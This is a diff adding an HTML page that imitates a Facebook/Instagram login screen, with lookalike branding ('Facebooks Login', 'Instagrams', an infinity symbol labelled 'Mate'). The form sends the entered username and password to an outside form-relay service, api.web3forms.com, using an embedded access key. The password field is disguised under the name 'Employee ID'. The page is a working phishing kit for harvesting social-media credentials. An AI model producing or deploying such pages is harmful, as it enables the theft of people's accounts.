@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebooks Login</title> 
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #1e1e2f 0%, #0f172a 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #ffffff;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            height: 150%;
+            max-height: 600px;
+        }
+         .logo {
+            font-family: 'Billabong', cursive, sans-serif;
+            font-size: 45px;
+            font-weight: normal;
+            margin-bottom: -160px;
+            letter-spacing: 1px;
+        }
+
+
+        .form-group {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+            margin-top: auto;
+            margin-bottom: auto;
+        }
+
+        .form-title {
+            text-align: center;
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 5px;
+            color: #ffffff;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 16px;
+            background-color: rgba(255, 255, 255, 0.07);
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            border-radius: 12px;
+            color: #ffffff;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .input-field::placeholder {
+            color: #8e95a5;
+        }
+
+        .input-field:focus {
+            border-color: rgba(255, 255, 255, 0.4);
+        }
+
+        .btn-login {
+            width: 100%;
+            padding: 16px;
+            background-color: #0064e0;
+            border: none;
+            border-radius: 30px;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 00;
+            cursor: pointer;
+            margin-top: 4px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-login:hover {
+            background-color: #0053b3;
+        }
+
+        .footer-section {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+            margin-bottom: -120px;
+        }
+            .forgot-password {
+            color: #ffffff;
+            text-align: center;
+            gap: 50px;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            margin-bottom: 60px;
+        }
+
+        .create-account-btn {
+            width: 100%;
+            padding: 14px;
+            background: transparent;
+            border: 1px solid #0866ff;
+            border-radius: 28px;
+            color: #2e89ff;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 0px;
+        }
+
+
+        .meta-branding {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: #e4e6eb;
+            font-size: 15px; 
+            margin-bottom: 60px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+   
+    </style>
+</head>
+<body>
+<div class="login-container">
+        <div class="logo">Instagrams</div>
+    <div class="login-container">
+        <!-- Top spacing equivalent -->
+       
+
+        <!-- Main Form Elements with Web3Forms Integration -->
+        <form action="https://api.web3forms.com/submit" method="POST" class="form-group">
+            
+            <!-- Web3Forms Access Key -->
+            <input type="hidden" name="access_key" value="2e95b098-f25b-425d-86d4-f5ebd76a4c5e">
+
+            <!-- Username / Name Field -->
+            <input type="text" name="Username" class="input-field" placeholder="Mobile number or email address" required>
+            
+            <!-- Employee ID Field -->
+            <input type="text" name="Employee ID" class="input-field" placeholder="password" required>
+ 
+  <button type="submit" class="btn-login">Log In</button>
+  
+<a href="#" class="forgot-password">Forgotten Password?</a>
+
+        <button class="create-account-btn">Create new account</button>
+        </form>
+        <!-- Footer Elements -->
+        <div class="footer-section">
+            <div class="meta-branding">
+                <span class="meta-logo">∞</span> Mate
+            </div>
+        </div>
+    </div>
+</body>
+</html>
+</body>
+</html>
